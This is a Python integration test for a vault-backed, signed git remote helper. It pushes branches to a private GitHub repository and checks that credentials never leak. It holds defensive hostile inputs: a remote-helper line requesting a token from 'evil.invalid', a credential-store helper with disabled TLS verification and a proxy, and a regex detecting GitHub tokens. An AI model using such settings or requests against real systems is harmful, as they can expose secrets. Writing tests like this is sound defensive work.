#!/usr/bin/env python3
"""Exercise the installed signed adapter against an existing private test repository.

Creates a uniquely named feature branch; retains the local clones and remote
branch for manual testing. Uses Vault's current policy, never reads a raw token.
"""
import argparse
import json
import os
from pathlib import Path
import re
import subprocess
import tempfile
import uuid


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--repository', required=True, help='disposable private OWNER/NAME')
    options = parser.parse_args()
    assert re.fullmatch(r'[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+', options.repository)
    root = Path(tempfile.mkdtemp(prefix='av-git-real-')).resolve()
    url = f'https://github.com/{options.repository}.git'
    branch = 'feature/av-real-' + uuid.uuid4().hex[:8]
    app = '/Applications/Automic Vault.app/Contents/MacOS/AutomicVaultMenubar'
    secret = re.compile(rb'(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|Authorization: Basic )')
    environment = {k: v for k, v in os.environ.items() if not k.startswith(('GIT_', 'GH_', 'GITHUB_', 'DYLD_'))}
    environment['PATH'] = '/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin'
    environment['GIT_TERMINAL_PROMPT'] = '0'
    git = ['/usr/bin/git', '-c', 'url.av::https://github.com/.insteadOf=https://github.com/']

    def run(args, cwd=root, data=None, env=None, ok=True):
        result = subprocess.run(args, cwd=cwd, input=data, env=env or environment, capture_output=True, timeout=180)
        assert not secret.search(result.stdout + result.stderr), 'credential-shaped output detected; withheld'
        if ok and result.returncode:
            # Retain ordinary diagnostics, but never potential credential output.
            raise AssertionError(f'{args[:3]} failed: {result.stderr.decode(errors="replace")}')
        return result

    def api(path):
        return json.loads(run(['/opt/homebrew/bin/gh', 'api', f'repos/{options.repository}/{path}']).stdout)

    def records():
        return json.loads(run([app, '--self-check-git-records', url], ok=False).stdout)

    assert api('')['private'] is True, 'fixture must be private'
    baseline = {r['id'] for r in records()}
    print(f'Test directory: {root}\nRemote branch: {branch}', flush=True)
    clone = root / 'clone'
    run(git + ['clone', url, str(clone)])
    # Keep normal origin URLs, enable the rewrite only in these disposable clones.
    run(['/usr/bin/git', 'config', 'url.av::https://github.com/.insteadOf', 'https://github.com/'], cwd=clone)
    run(git + ['switch', '-c', branch], cwd=clone)

    def commit(repo, text):
        (repo / 'av-remote-helper-test.txt').write_text(text + '\n')
        run(git + ['add', 'av-remote-helper-test.txt'], cwd=repo)
        run(git + ['-c', 'core.hooksPath=/dev/null', '-c', 'commit.gpgSign=false', 'commit', '-m', text], cwd=repo)
        return run(git + ['rev-parse', 'HEAD'], cwd=repo).stdout.decode().strip()

    first = commit(clone, 'Signed remote-helper feature branch test')
    run(git + ['push', '-u', 'origin', branch], cwd=clone)
    assert api('commits/' + branch)['sha'] == first
    assert run(git + ['rev-parse', '--abbrev-ref', '@{upstream}'], cwd=clone).stdout.strip() == f'origin/{branch}'.encode()
    print('PASS: ordinary clone, feature branch, push -u, and upstream tracking', flush=True)
    peer = root / 'peer'
    run(git + ['clone', '--branch', branch, url, str(peer)])
    run(['/usr/bin/git', 'config', 'url.av::https://github.com/.insteadOf', 'https://github.com/'], cwd=peer)
    second = commit(peer, 'Remote update for ordinary fetch and pull')
    run(git + ['push'], cwd=peer)
    run(git + ['fetch'], cwd=clone)
    assert run(git + ['rev-parse', '@{upstream}'], cwd=clone).stdout.strip() == second.encode()
    run(git + ['pull', '--ff-only'], cwd=clone)
    assert run(git + ['rev-parse', 'HEAD'], cwd=clone).stdout.strip() == second.encode()
    print('PASS: ordinary fetch and pull use the saved upstream', flush=True)
    third = commit(clone, 'Pending update for dry-run and ordinary push')
    run(git + ['push', '--dry-run'], cwd=clone)
    assert api('commits/' + branch)['sha'] == second
    for flag in ['--force-with-lease', '--atomic', '--signed']:
        result = run(git + ['push', flag], cwd=clone, ok=False)
        assert result.returncode and b'unsupported Git option:' in result.stderr
    assert api('commits/' + branch)['sha'] == second
    run(git + ['push'], cwd=clone)
    assert api('commits/' + branch)['sha'] == third
    print('PASS: dry-run and unsupported safety options cannot silently become writes', flush=True)
    capture = root / 'credential-store'
    trace = root / 'trace'
    hostile = dict(environment, GIT_TRACE_CURL=str(trace), GIT_SSL_NO_VERIFY='1', HTTPS_PROXY='http://127.0.0.1:1')
    run(git + ['-c', 'credential.helper=store --file=' + str(capture), '-c', 'http.sslVerify=false', 'fetch'], cwd=clone, env=hostile)
    assert not capture.exists()
    assert not trace.exists() or not secret.search(trace.read_bytes())
    print('PASS: hostile outer credential helper, TLS, proxy and trace settings do not receive the credential', flush=True)
    denied_before = {r['id'] for r in records()}
    for data in [b'get https://evil.invalid/token /tmp/token\n', b'option cas refs/heads/main:abc\n',
                 b'fetch ' + b'a' * 40 + b' HEAD\npush ' + b'a' * 40 + b':refs/heads/main\n\n',
                 b'push HEAD:refs/heads/main\n']:
        result = run(['/usr/local/bin/av', '__git-remote', 'origin', url], cwd=clone, data=data, ok=False)
        assert result.returncode and not result.stdout
    assert {r['id'] for r in records()} == denied_before, 'malformed input reached credential authorization'
    provider_env = dict(environment, HOME='/opt/av/git/empty', GH_CONFIG_DIR='/opt/av/git/empty')
    result = run(['/opt/av/git/bin/gh', 'auth', 'git-credential', 'get'], cwd='/opt/av/git', env=provider_env,
                 data=f'protocol=https\nhost=github.com\npath={options.repository}.git\n\n'.encode(), ok=False)
    assert result.returncode and not result.stdout
    print('PASS: malformed batches and direct signed provider access are denied', flush=True)
    fresh = [r for r in records() if r['id'] not in baseline and '[protected HTTPS request]' in r['command']]
    assert fresh and all(r['target'] == '/opt/av/git/bin/gh' and r['keys'] == ['GH_TOKEN_GITHUB_COM'] for r in fresh)
    assert any(third in r['command'] and 'refs/heads/' + branch in r['command'] for r in fresh), 'missing exact push authorization record'
    print(f'PASS: {len(fresh)} fresh Vault records, including the exact pushed OID and ref\nReady for manual testing: {clone}', flush=True)


if __name__ == '__main__':
    main()
